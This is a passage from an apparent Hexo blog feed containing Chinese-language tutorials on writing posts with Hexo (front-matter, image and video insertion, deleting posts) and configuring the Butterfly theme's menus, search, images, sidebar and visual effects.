class="line">---</span><br></pre></td></tr></table></figure><p>如何自定义布局呢？实际上，布局是一个markdown文件，它们保存在scaffolds&#x2F;目录下，可以看到hexo自带的三种布局其实就是三个.md文件：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101022175.png" alt="image-20240410102220147">  </p><p>每一个文件中的内容实际只包含一个Front-matter。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101022119.png" alt="image-20240410102227091">  </p><p>因此，可以在这里修改布局或者建立新的布局，然后创建文章时使用这些布局。</p><h1 id="开始写文章"><a href="#开始写文章" class="headerlink" title="开始写文章"></a>开始写文章</h1><p>两个虚线之间的内容就是叫Front-matter，主要是文章的配置，具体配置如下，不同主题配置不一样，这块以<strong>Matery</strong>主题为例</p><p>Front-matter 选项中的所有内容均为<strong>非必填</strong>的。但我仍然建议至少填写 title 和 date 的值。</p><table><thead><tr><th align="center"><strong>配置选项</strong></th><th align="center"><strong>默认值</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td align="center">title</td><td align="center">Markdown 的文件标题</td><td>文章标题，强烈建议填写此选项</td></tr><tr><td align="center">date</td><td align="center">文件创建时间日期</td><td>建议使用发布日期时间</td></tr><tr><td align="center">author</td><td align="center">根 _config.yml 中的 author</td><td>文章作者</td></tr><tr><td align="center">img</td><td align="center">featureImages 中的某个值</td><td>文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: <a href="http://xxx.com/xxx.jpg">http://xxx.com/xxx.jpg</a></td></tr><tr><td align="center">top</td><td align="center">true</td><td>推荐文章（文章是否置顶），如果 top 值为 true，则会作为首页推荐文章</td></tr><tr><td align="center">cover</td><td align="center">false</td><td>v1.0.2版本新增，表示该文章是否需要加入到首页轮播封面中</td></tr><tr><td align="center">coverImg</td><td align="center">无</td><td>v1.0.2版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片</td></tr><tr><td align="center">password</td><td align="center">无</td><td>文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 password 的值，该值必须是用 SHA256 加密后的密码，防止被他人识破。前提是在主题的 config.yml 中激活了 verifyPassword 选项</td></tr><tr><td align="center">toc</td><td align="center">true</td><td>是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 config.yml 中激活了 toc 选项</td></tr><tr><td align="center">mathjax</td><td align="center">false</td><td>是否开启数学公式支持 ，本文章是否开启 mathjax，且需要在主题的 _config.yml 文件中也需要开启才行</td></tr><tr><td align="center">summary</td><td align="center">无</td><td>文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要</td></tr><tr><td align="center">categories</td><td align="center">无</td><td>文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类</td></tr><tr><td align="center">tags</td><td align="center">无</td><td>文章标签，一篇文章可以多个标签</td></tr><tr><td align="center">keywords</td><td align="center">文章标题</td><td>文章关键字，SEO 时需要</td></tr><tr><td align="center">reprintPolicy</td><td align="center">cc_by</td><td>文章转载规则， 可以是 cc_by, cc_by_nd, cc_by_sa, cc_by_nc, cc_by_nc_nd, cc_by_nc_sa, cc0, noreprint 或 pay 中的一个</td></tr></tbody></table><p>以下为文章的 Front-mattre示例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: hexo开始写博客</span><br><span class="line">date: 2024-03-26 09:25:00</span><br><span class="line">author: Muhe</span><br><span class="line">img: /source/images/xxx.jpg</span><br><span class="line">top: true</span><br><span class="line">cover: true</span><br><span class="line">coverImg: /images/1.jpg</span><br><span class="line">password: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92</span><br><span class="line">toc: false</span><br><span class="line">mathjax: false</span><br><span class="line">summary: 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要</span><br><span class="line">categories: Markdown</span><br><span class="line">tags:</span><br><span class="line">  - Typora</span><br><span class="line">  - Markdown</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>【Tips】发现一个问题，每次hexo n的时候Front-matter中内容少的可怜，那怎么修改默认的格式呢？只要去主目录下找到scaffolds文件夹下找到一个post.md文件修改即可：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line"># 标题</span><br><span class="line">title: &#123;&#123; title &#125;&#125;</span><br><span class="line">date: &#123;&#123; date &#125;&#125;</span><br><span class="line">author: 无敌小小弋</span><br><span class="line"># 简述</span><br><span class="line">summary:</span><br><span class="line"># 使用自定义封面 </span><br><span class="line">img: </span><br><span class="line"># 是否置顶true，或者去掉</span><br><span class="line">top: true</span><br><span class="line"># 轮播</span><br><span class="line">cover:</span><br><span class="line"># 轮播图</span><br><span class="line">coverImg: </span><br><span class="line"># 标签</span><br><span class="line">tags: </span><br><span class="line"># 分类</span><br><span class="line">categories: </span><br><span class="line"># 是否加密文章，SHA256加密</span><br><span class="line">password: </span><br><span class="line">---</span><br></pre></td></tr></table></figure><h1 id="文章插入图片"><a href="#文章插入图片" class="headerlink" title="文章插入图片"></a>文章插入图片</h1><p>图片几乎是写博客时不可或缺的元素。在hexo中插入图片需要先进行一些设置，不过在介绍那之前让我们先回顾一下markdown引用图片的语法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">![alt](path [title])</span><br></pre></td></tr></table></figure><ul><li>path是必选的，表示图片的路径，可使用绝对或相对路径。</li><li>alt是可选的，是图片无法加载时的替代描述文本。</li><li>title是可选的，是图片的标题。</li></ul><p>在hexo中，引用图片不是简单的使用上述语法即可，你还需要为图片制定一个<strong>资源文件夹</strong>。具体来说，hexo中文章引用图片有两种方式：</p><ol><li><p>将所有文章的图片放到source&#x2F;images 文件夹中（没有就自己创建一个），然后使用markdown语句引用图片。这种方法一般适用于包含少量图片的hexo项目，但是当文章数量增多，图片数也随之增加后，该管理方式就显得有些混乱。因此我个人推荐你使用下面一种方法。</p></li><li><p>为每一个文章创建一个资源文件夹，将图片保存其中，具体步骤如下：</p><ul><li><p>在博客根目录打开_config.yml文件做如下修改：<br>yaml post_asset_folder: true</p></li><li><p>然后使用hexo n text命令后创建一个使用post布局名为text的文章，你将发现hexo在\source_post文件夹下创建了一个\text文件夹以及同名的.md文件：</p></li><li><p>最后就可以打开text.md文件进行编辑了，你可以把要引用的图片放到同名文件夹下，然后使用相对路径进行引用。<strong>注意</strong>：请不要自作聪明将text.md文件移动到同名文件夹下，经本人尝试，发现这样会导致图片无法正常引用。</p></li></ul></li></ol><p><strong>Tip</strong>：如果你使用的是<a href="https://link.zhihu.com/?target=https://www.typora.io/">Typora</a>编辑器，可以在编辑器的文件&#x2F;偏好设置&#x2F;图像中进行如下设置：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101022069.png" alt="image-20240410102243042">  </p><p>这样每次直接拷贝到文章的截图将会被自动保存到同名的文件夹下，非常方便~</p><p>但有可能设置了上面的相关配置后，图片依旧加载不出来，下面是两种解决办法：</p><h2 id="本地图片加载不出来"><a href="#本地图片加载不出来" class="headerlink" title="本地图片加载不出来"></a>本地图片加载不出来</h2><p>插件<a href="https://link.zhihu.com/?target=https://github.com/hexojs/hexo-renderer-marked">hexo-renderer-marked</a>解决了这个问题。可以直接用npm install hexo-renderer-marked命令直接安装，之后在config.yaml中更改配置如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">post_asset_folder: true</span><br><span class="line">marked:</span><br><span class="line">  prependRoot: true</span><br><span class="line">  postAsset: true</span><br></pre></td></tr></table></figure><p>hexo三连后，本地加载的图片就可以正常显示了。</p><h2 id="在线图片加载不出来"><a href="#在线图片加载不出来" class="headerlink" title="在线图片加载不出来"></a>在线图片加载不出来</h2><p>这个解决方法其实很简单，只需要文章的头部如下图所示位置添加<meta name="referrer" content="no-referrer"/>这一句话就可以完美解决问题</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404101022344.png" alt="image-20240410102251316">  </p><h1 id="插入视频"><a href="#插入视频" class="headerlink" title="插入视频"></a>插入视频</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;video width=&quot;480&quot; height=&quot;320&quot; controls&gt;</span><br><span class="line">     &lt;source src=video_path&gt;</span><br><span class="line">&lt;/video&gt;</span><br></pre></td></tr></table></figure><ul><li>video_path是视频的存储路径（含双引号），你可以把视频放在文章的同名资源文件夹下，然后用相对路径方式引用。</li><li>width和height是视频区块的宽度和高度，可自定义。</li></ul><h1 id="删除文章"><a href="#删除文章" class="headerlink" title="删除文章"></a>删除文章</h1><p>删除文章的过程一样也很简单，先删除本地文件，然后通过生成和部署命令进而将远程仓库中的文件也一并删除。具体来说，以最开始默认形成的helloworld.md这篇文章为例。</p><p>首先进入到source &#x2F; _post 文件夹中，找到helloworld.md文件，在本地直接执行删除。然后依次执行hexo g，hexo d，再去主页查看你就会发现你的博客上面已经空空如也了，这就是如何删除文章的方法。</p>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自定义博客主题相关设置</title>
      <link href="/2024/03/22/%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8D%9A%E5%AE%A2%E4%B8%BB%E9%A2%98%E7%9B%B8%E5%85%B3%E8%AE%BE%E7%BD%AE/"/>
      <url>/2024/03/22/%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8D%9A%E5%AE%A2%E4%B8%BB%E9%A2%98%E7%9B%B8%E5%85%B3%E8%AE%BE%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="安装butterfly主题"><a href="#安装butterfly主题" class="headerlink" title="安装butterfly主题"></a>安装butterfly主题</h1><p>首先，在hexo的根目录下使用如下命令下载主题</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure><p>npm安装pug 和 stylus 渲染器。不然会报错</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure><p>修改项目根目录下的_config.yml文件（称为站点配置文件），开启主题。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Extensions</span><br><span class="line">## Plugins: https://hexo.io/plugins/</span><br><span class="line">## Themes: https://hexo.io/themes/</span><br><span class="line">theme: butterfly</span><br></pre></td></tr></table></figure><p>【建议】</p><p>为了减少升级&#x2F;修改主题带来的不便，可以将主题目录下（&#x2F;blog&#x2F;theme）的配置文件 _config.yml 重命名为 _config.butterfly.yml，复制到 Hexo 根目录下与_config.yml同级。</p><p>Hexo会自动合并主题中的_config.yml和 _config.butterfly.yml ，如果存在同名配置，会使用_config.butterfly.yml的配置，其优先度较高。所以像和博客网址相关联的固定资料可以设置在_config.yml中，比如博客的标题、作者信息和邮箱等等资料，而和主题样式相关的配置放在 _config.butterfly.yml 中，那么在将来你想换一个主题是很方便的。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091730067.png" alt="image-20240409173030013"> </p><h1 id="导航栏菜单"><a href="#导航栏菜单" class="headerlink" title="导航栏菜单"></a>导航栏菜单</h1><p>修改主题配置文件 _config.butterfly.yml</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">menu:</span><br><span class="line">  主页: / || fas fa-home</span><br><span class="line">  博文 || fa fa-graduation-cap:</span><br><span class="line">    分类: /categories/ || fa fa-archive</span><br><span class="line">    标签: /tags/ || fa fa-tags</span><br><span class="line">    归档: /archives/ || fa fa-folder-open</span><br><span class="line">  生活 || fas fa-list:</span><br><span class="line">    分享: /shuoshuo/ || fa fa-comments-o</span><br><span class="line">    相册: /photos/ || fa fa-camera-retro</span><br><span class="line">    音乐: /music/ || fa fa-music</span><br><span class="line">    影视: /movies/ || fas fa-video</span><br><span class="line">  友链: /links/ || fa fa-link</span><br><span class="line">  留言板: /comment/ || fa fa-paper-plane</span><br><span class="line">  #留言板: /messageboard/ || fa fa-paper-plane</span><br><span class="line">  关于笔者: /about/ || fas fa-heart  </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091731911.png" alt="image-20240409173101879">  </p><h1 id="代码块显示"><a href="#代码块显示" class="headerlink" title="代码块显示"></a>代码块显示</h1><p>在_config.butterfly.yml配置文件中可以配置如下功能。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_theme: mac  #  darker / pale night / light / ocean / mac / mac light / false 代码主题</span><br><span class="line">highlight_copy: true # 复制按钮</span><br><span class="line">highlight_lang: false # 是否显示代码语言</span><br><span class="line">highlight_shrink: false # true: 代码块默认不展开 / false: 代码块默认展开 | none: 展开并隐藏折叠按钮</span><br><span class="line">highlight_height_limit: false # unit: px</span><br><span class="line">code_word_wrap: false #代码自动换行，关闭滚动条</span><br></pre></td></tr></table></figure><p>同时将站点默认配置文件_config.yml的highlight设置为false。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight:</span><br><span class="line">  enable: false</span><br><span class="line">  line_number: false</span><br><span class="line">  auto_detect: false</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091731319.png" alt="image-20240409173121285"> </p><h1 id="本地搜索功能"><a href="#本地搜索功能" class="headerlink" title="本地搜索功能"></a>本地搜索功能</h1><p>如果要使用本地搜索功能，需要安装 hexo-generator-search 插件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure><p>修改_config.butterfly.yml 配置文件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Local search</span><br><span class="line">local_search:</span><br><span class="line">  enable: true</span><br><span class="line">  labels:</span><br><span class="line">    input_placeholder: Search for Posts</span><br><span class="line">    hits_empty: &quot;We didn&#x27;t find any results for the search: $&#123;query&#125;&quot; # 如果没有查到内容相关内容显示</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091731709.png" alt="image-20240409173142597">  </p><h1 id="修改副标题"><a href="#修改副标题" class="headerlink" title="修改副标题"></a>修改副标题</h1><p>修改主题配置文件 _config.butterfly.yml:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># the subtitle on homepage (主頁subtitle)</span><br><span class="line">subtitle:</span><br><span class="line">  enable: true</span><br><span class="line">  # Typewriter Effect (开启打字效果)</span><br><span class="line">  effect: true</span><br><span class="line">  # loop (循環打字)</span><br><span class="line">  loop: true</span><br><span class="line">  # source調用第三方服務</span><br><span class="line">  # source: false 關閉調用</span><br><span class="line">  # source: 1  調用搏天api的隨機語錄（簡體）</span><br><span class="line">  # source: 2  調用一言網的一句話（簡體）</span><br><span class="line">  # source: 3  調用一句網（簡體）</span><br><span class="line">  # source: 4  調用今日詩詞（簡體）</span><br><span class="line">  # subtitle 會先顯示 source , 再顯示 sub 的內容</span><br><span class="line">  source: false</span><br><span class="line">  # 如果有英文逗号&#x27; , &#x27;,请使用转义字元 &amp;#44;</span><br><span class="line">  # 如果有英文双引号&#x27; &quot; &#x27;,请使用转义字元 &amp;quot;</span><br><span class="line">  # 开头不允許转义字元，如需要，请把整個句子用双引号包住</span><br><span class="line">  # 如果关闭打字效果，subtitle只会现示sub的第一行文字</span><br><span class="line">  sub:</span><br><span class="line">    - 从来没有真正的绝境，只有心灵的迷途</span><br><span class="line">    - Never really desperate，only the lost of the soul</span><br><span class="line">    - 没有选择会是唯一的路</span><br><span class="line">    - No choice will be the only way</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091731603.png" alt="image-20240409173155522">   </p><h1 id="图片设置"><a href="#图片设置" class="headerlink" title="图片设置"></a>图片设置</h1><p>图片可以用云链接或者本地路径：&#x2F;themes&#x2F;butterfly&#x2F;source&#x2F;img。修改主题配置文件_config.butterfly.yml：</p><h2 id="网站图标"><a href="#网站图标" class="headerlink" title="网站图标"></a>网站图标</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Favicon（网站图）</span><br><span class="line">favicon: /img/favicon.png</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091732790.png" alt="image-20240409173204664">  </p><h2 id="头像"><a href="#头像" class="headerlink" title="头像"></a>头像</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">avatar:</span><br><span class="line">  img: /img/avatar.jpg #图片路径</span><br><span class="line">  effect: false #头像会一直转圈  </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091737311.png" alt="image-20240409173712278">  </p><h2 id="主页封面图片"><a href="#主页封面图片" class="headerlink" title="主页封面图片"></a>主页封面图片</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># The banner image of home page</span><br><span class="line">index_img: /img/background.jpg</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091738768.png" alt="image-20240409173816493">  </p><h2 id="文章详情页顶部图片"><a href="#文章详情页顶部图片" class="headerlink" title="文章详情页顶部图片"></a>文章详情页顶部图片</h2><p>当没有在front-matter设置top_img和cover的情况下会显示该图</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># If the banner of page not setting, it will show the top_img</span><br><span class="line">default_top_img: /img/default_top_img.jpg </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091739148.png" alt="image-20240409173923951">  </p><h2 id="归档页底部图片"><a href="#归档页底部图片" class="headerlink" title="归档页底部图片"></a>归档页底部图片</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#归档子标签页图片</span><br><span class="line"># The banner image of archive page</span><br><span class="line">archive_img: /img/archive.jpg</span><br></pre></td></tr></table></figure><h2 id="tag页顶部图片"><a href="#tag页顶部图片" class="headerlink" title="tag页顶部图片"></a>tag页顶部图片</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#tag页（标签页）</span><br><span class="line">tag_img: /img/tag_img.jpg</span><br></pre></td></tr></table></figure><h2 id="category页顶部图片"><a href="#category页顶部图片" class="headerlink" title="category页顶部图片"></a>category页顶部图片</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#category页</span><br><span class="line">category_img: /img/category_img.jpg</span><br></pre></td></tr></table></figure><h2 id="统一文章封面"><a href="#统一文章封面" class="headerlink" title="统一文章封面"></a>统一文章封面</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cover:</span><br><span class="line">  index_enable: true #  是否展示文章封面</span><br><span class="line">  aside_enable: true</span><br><span class="line">  archives_enable: true</span><br><span class="line">  position: both # 封面展示的位置 left/right/both</span><br><span class="line">  # 当没有设置cover时，默认展示的文章封面</span><br><span class="line">  default_cover:</span><br><span class="line">    # 当配置多张图片时，会随机选择一张作为 cover. 此时写法为</span><br><span class="line">    - https:</span><br><span class="line">    - http:</span><br><span class="line">    - http:</span><br><span class="line">    - http:</span><br><span class="line">    - http:</span><br><span class="line">    - http:</span><br></pre></td></tr></table></figure><p>如果需要为每一篇文章设置不同的封面，可以在文章的md文件中添加配置。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: Hello World        # 标题</span><br><span class="line">tags: [hello]             # 标签</span><br><span class="line">categories:               # 分类</span><br><span class="line">description: hello word~  # 描述</span><br><span class="line">top_img: /img/hello-1.png # 顶部背景图</span><br><span class="line">cover: /img/hello-1.png   # 文章封面</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091739478.png" alt="image-20240409173949425">  </p><h2 id="错误页面"><a href="#错误页面" class="headerlink" title="错误页面"></a>错误页面</h2><p>配置了该属性后会替换无法展示的图片</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Replace Broken Images (替換無法顯示的圖片)</span><br><span class="line">error_img:</span><br><span class="line">  flink: /img/friend_404.gif</span><br><span class="line">  post_page: /img/404.jpg</span><br></pre></td></tr></table></figure><h1 id="图片懒加载"><a href="#图片懒加载" class="headerlink" title="图片懒加载"></a>图片懒加载</h1><p>新增hexo-lazyload-image模块</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">npm install hexo-lazyload-image --save</span><br></pre></td></tr></table></figure><p>在主目录配置文件_config.yml增加配置</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">lazyload:</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  loadingImg: /img/loading.gif</span><br></pre></td></tr></table></figure><p>这个就是图片没加载出来的时候，出现一个动图转转转的文章页样式 </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091740516.png" alt="image-20240409174005478">  </p><h1 id="图片放大查看"><a href="#图片放大查看" class="headerlink" title="图片放大查看"></a>图片放大查看</h1><p>修改主题配置文件_config.butterfly.yml</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">medium_zoom: <span class="literal">false</span></span><br><span class="line">fancybox: <span class="literal">true</span></span><br></pre></td></tr></table></figure><h1 id="版权样式"><a href="#版权样式" class="headerlink" title="版权样式"></a>版权样式</h1><p>修改主题配置文件_config.butterfly.yml</p><p>复制的内容后面加上版权信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># copy settings</span><br><span class="line"># copyright: Add the copyright information after copied content (複製的內容後面加上版權信息)</span><br><span class="line">copy:</span><br><span class="line">  enable: true # 是否开启网站复制权限</span><br><span class="line">  copyright:  # 复制的内容后面加上版权信息</span><br><span class="line">    enable: false  # 是否开启复制版权信息添加</span><br><span class="line">    limit_count: 50 # 字数限制，当复制文字大于这个字数限制时</span><br></pre></td></tr></table></figure><p>文章版权信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">post_copyright:</span><br><span class="line">  enable: true</span><br><span class="line">  decode: true</span><br><span class="line">  license: CC BY-NC-SA 4.0</span><br><span class="line">  license_url: https://creativecommons.org/licenses/by-nc-sa/4.0/</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091740536.png" alt="image-20240409174018503">  </p><h1 id="侧边栏样式"><a href="#侧边栏样式" class="headerlink" title="侧边栏样式"></a>侧边栏样式</h1><p>修改主题配置文件_config.butterfly.yml</p><p>调整侧边栏出现位置</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">aside:</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  hide: <span class="literal">false</span></span><br><span class="line">  button: <span class="literal">true</span></span><br><span class="line">  mobile: <span class="literal">true</span> # display on mobile</span><br><span class="line">  position: right # left or right </span><br></pre></td></tr></table></figure><p>个人信息</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">social:</span><br><span class="line">   fab fa-github: https:<span class="comment">//github.com/ || Github</span></span><br><span class="line">   fa fa-book-open: https:<span class="comment">//blog.csdn.net/mjh1667002013 || CSDN</span></span><br><span class="line">   fab fa-qq:  tencent:<span class="comment">//AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=728831102&amp;website=www.oicqzone.com || QQ</span></span><br><span class="line">   fas fa-envelope-open-text: mailto:<span class="number">1976083684</span><span class="meta">@qq</span>.com || Email</span><br></pre></td></tr></table></figure><h1 id="公告栏设置"><a href="#公告栏设置" class="headerlink" title="公告栏设置"></a>公告栏设置</h1><p>修改主题配置文件_config.butterfly.yml</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">card_announcement:</span><br><span class="line">    enable: <span class="literal">true</span></span><br><span class="line">    content: This is my Blog #修改公告栏信息</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091740662.png" alt="image-20240409174030633">  </p><h1 id="TOC目录"><a href="#TOC目录" class="headerlink" title="TOC目录"></a>TOC目录</h1><p>修改主题配置文件_config.butterfly.yml</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># toc (目錄)</span><br><span class="line">toc:</span><br><span class="line">  post: <span class="literal">true</span></span><br><span class="line">  page: <span class="literal">false</span></span><br><span class="line">  number: <span class="literal">false</span></span><br><span class="line">  expand: <span class="literal">true</span> # 是否展开</span><br><span class="line">  style_simple: <span class="literal">false</span> # <span class="keyword">for</span> post</span><br><span class="line">  scroll_percent: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091740966.png" alt="image-20240409174038930">  </p><h1 id="背景美化"><a href="#背景美化" class="headerlink" title="背景美化"></a>背景美化</h1><p>修改主题配置文件 _config.butterfly.yml</p><h2 id="鼠标点击效果"><a href="#鼠标点击效果" class="headerlink" title="鼠标点击效果"></a>鼠标点击效果</h2><p>有冒光特效、烟火特效、爱心特效、文字特效，选择其中一个将enable设置为true就可以。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Typewriter <span class="title function_">Effect</span> <span class="params">(打字效果)</span></span><br><span class="line"># https:<span class="comment">//github.com/disjukr/activate-power-mode</span></span><br><span class="line">activate_power_mode:</span><br><span class="line">  enable: <span class="literal">false</span></span><br><span class="line">  colorful: <span class="literal">true</span> # open particle <span class="title function_">animation</span> <span class="params">(冒光特效)</span></span><br><span class="line">  shake: <span class="literal">true</span> #  open <span class="title function_">shake</span> <span class="params">(抖动特效)</span></span><br><span class="line">  mobile: <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"># Mouse click effects: fireworks (鼠标点击效果:萤火特效)</span><br><span class="line">fireworks:</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  zIndex: <span class="number">9999</span> # -<span class="number">1</span> or <span class="number">9999</span></span><br><span class="line">  mobile: <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"># Mouse click effects: Heart <span class="title function_">symbol</span> <span class="params">(鼠标点击效果: 爱心)</span></span><br><span class="line">click_heart:</span><br><span class="line">  enable: <span class="literal">false</span></span><br><span class="line">  mobile: <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"># Mouse click effects: words (鼠标点击效果: 文字)</span><br><span class="line">ClickShowText:</span><br><span class="line">  enable: <span class="literal">false</span></span><br><span class="line">  text:</span><br><span class="line">     - 富强</span><br><span class="line">     - 民主</span><br><span class="line">     - 文明</span><br><span class="line">     - 和谐</span><br><span class="line">     - 平等</span><br><span class="line">     - 公正</span><br><span class="line">     - 法治</span><br><span class="line">     - 爱国</span><br><span class="line">     - 敬业</span><br><span class="line">     - 诚信</span><br><span class="line">     - 友善</span><br><span class="line">  fontSize: 15px</span><br><span class="line">  random: <span class="literal">true</span></span><br><span class="line">  mobile: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091740263.png" alt="image-20240409174048213">   </p><h2 id="打字效果"><a href="#打字效果" class="headerlink" title="打字效果"></a>打字效果</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Typewriter <span class="title function_">Effect</span> <span class="params">(打字效果)</span></span><br><span class="line"># https:<span class="comment">//github.com/disjukr/activate-power-mode</span></span><br><span class="line">activate_power_mode:</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  colorful: <span class="literal">true</span> # open particle <span class="title function_">animation</span> <span class="params">(冒光特效)</span></span><br><span class="line">  shake: <span class="literal">true</span> #  open <span class="title function_">shake</span> <span class="params">(抖动特效)</span></span><br><span class="line">  mobile: <span class="literal">true</span></span><br></pre></td></tr></table></figure><h2 id="背景特效"><a href="#背景特效" class="headerlink" title="背景特效"></a>背景特效</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Background <span class="title function_">effects</span> <span class="params">(背景特效)</span></span><br><span class="line"># canvas_ribbon (静止彩带)</span><br><span class="line"># See: https:<span class="comment">//github.com/hustcc/ribbon.js</span></span><br><span class="line">canvas_ribbon:</span><br><span class="line">  enable: <span class="literal">false</span></span><br><span class="line">  size: <span class="number">150</span></span><br><span class="line">  alpha: <span class="number">0.6</span></span><br><span class="line">  zIndex: -<span class="number">1</span></span><br><span class="line">  click_to_change: <span class="literal">false</span></span><br><span class="line">  mobile: <span class="literal">false</span></span><br><span class="line"># Fluttering <span class="title function_">Ribbon</span> <span class="params">(动态彩带)</span></span><br><span class="line">canvas_fluttering_ribbon:</span><br><span class="line">  enable: <span class="literal">false</span></span><br><span class="line">  mobile: <span class="literal">false</span></span><br><span class="line">#星空特效</span><br><span class="line"># canvas_nest</span><br><span class="line"># https:<span class="comment">//github.com/hustcc/canvas-nest.js</span></span><br><span class="line">canvas_nest:</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  color: <span class="string">&#x27;0,0,255&#x27;</span> #color of lines, <span class="keyword">default</span>: <span class="string">&#x27;0,0,0&#x27;</span>; RGB values: (R,G,B).(note: use <span class="string">&#x27;,&#x27;</span> to separate.)</span><br><span class="line">  opacity: <span class="number">0.7</span> # the opacity of <span class="title function_">line</span> <span class="params">(<span class="number">0</span>~<span class="number">1</span>)</span>, <span class="keyword">default</span>: <span class="number">0.5</span>.</span><br><span class="line">  zIndex: -<span class="number">1</span> # z-index property of the background, <span class="keyword">default</span>: -<span class="number">1.</span></span><br><span class="line">  count: <span class="number">99</span> # the number of lines, <span class="keyword">default</span>: <span class="number">99.</span></span><br><span class="line">  mobile: <span class="literal">false</span></span><br></pre></td></tr></table></figure><h2 id="自定义背景主题色"><a 